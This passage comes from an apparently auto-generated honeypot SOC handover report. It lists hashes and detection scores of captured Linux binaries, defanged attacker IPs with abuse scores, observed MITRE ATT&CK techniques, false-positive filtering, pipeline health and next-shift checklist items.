| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.48.106[.]235` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 19 |
| `66.132.172[.]133` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `168.228.192[.]190` | HN | MULTICABLE DE HONDURAS | **100** ⚠️ | 1 |
| `40.121.179[.]100` | US | Microsoft Corporation | **100** ⚠️ | 4 |
| `101.126.147[.]62` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 31 |
| `103.49.238[.]63` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 9 |
| `112.18.182[.]202` | CN | China Mobile Communications Corporation | **100** ⚠️ | 2 |
| `168.197.99[.]122` | CR | Data Miners S.A. ( Racknation.cr ) | **100** ⚠️ | 0 |
| `120.48.106[.]205` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `125.141.139[.]31` | KR | Korea Telecom | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 114 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 53 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 37 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |

---

## 🔕 False Positive Summary (72 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 20 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 15 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 400 cases |
| Tool 34  | Credential Extractor        | ✅ 90 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 58 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 72 filtered (18.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 44 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 37 priority case(s) shown individually · 40 recon entry/entries in table (15 group(s) consolidating 266 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-24T07:27:43Z_
